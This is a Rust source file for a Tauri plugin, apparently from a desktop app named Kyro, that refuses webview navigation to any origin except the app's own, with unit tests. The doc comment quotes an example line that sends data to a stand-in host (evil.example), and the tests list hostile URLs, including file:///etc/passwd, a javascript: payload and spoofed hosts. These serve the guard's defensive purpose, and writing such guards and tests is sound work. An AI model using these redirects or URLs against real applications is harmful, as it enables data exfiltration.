//! Navigation guard: the webview may only ever show Kyro's own pages.
//!
//! The CSP blocks `fetch`/XHR to other hosts, but not a top-level navigation: a compromised
//! page could run `location.href = "https://evil.example/?d=…"` and the data would leave in
//! clear, outside Tor and outside `net_fetch`'s allowlist. This plugin refuses every
//! navigation that is not to the app's own origin (`tauri://localhost` on macOS/Linux,
//! `http(s)://tauri.localhost` on Windows, plus the dev server in debug builds), and the main
//! window refuses every `window.open` (see `lib.rs`).

use tauri::plugin::{Builder, TauriPlugin};
use tauri::{Runtime, Url};

/// True for the app's own pages (and `about:blank`, which carries nothing).
pub fn is_app_url(url: &Url, dev: Option<&Url>) -> bool {
    let host = url.host_str().unwrap_or_default();
    match url.scheme() {
        "tauri" => host == "localhost",
        "http" | "https" if host == "tauri.localhost" => url.port().is_none(),
        "about" => url.as_str() == "about:blank",
        _ => dev.is_some_and(|d| {
            d.scheme() == url.scheme()
                && d.host_str() == url.host_str()
                && d.port_or_known_default() == url.port_or_known_default()
        }),
    }
}

/// The plugin, checked for every navigation of every webview. `dev` = `build.devUrl`, only
/// honoured in debug builds.
pub fn init<R: Runtime>(dev: Option<Url>) -> TauriPlugin<R> {
    let dev = if cfg!(debug_assertions) { dev } else { None };
    Builder::new("kyro-nav-guard")
        .on_navigation(move |_webview, url| is_app_url(url, dev.as_ref()))
        .build()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn u(s: &str) -> Url {
        Url::parse(s).unwrap()
    }

    #[test]
    fn only_app_origin() {
        for ok in [
            "tauri://localhost/",
            "tauri://localhost/index.html#/settings",
            "http://tauri.localhost/",
            "https://tauri.localhost/assets/app.js",
            "about:blank",
        ] {
            assert!(is_app_url(&u(ok), None), "{ok}");
        }
        for bad in [
            "https://evil.example/?d=secret",
            "http://tauri.localhost.evil.example/",
            "http://evil.example/tauri.localhost",
            "tauri://evil/",
            "http://tauri.localhost:8080/",
            "data:text/html,<script>1</script>",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "mailto:a@b.c",
            "http://localhost:1420/",
            "about:srcdoc",
        ] {
            assert!(!is_app_url(&u(bad), None), "{bad}");
        }
        // Dev server: exact origin only.
        let dev = u("http://localhost:1420");
        assert!(is_app_url(
            &u("http://localhost:1420/src/main.tsx"),
            Some(&dev)
        ));
        assert!(!is_app_url(&u("http://localhost:1421/"), Some(&dev)));
        assert!(!is_app_url(&u("https://localhost:1420/"), Some(&dev)));
    }
}
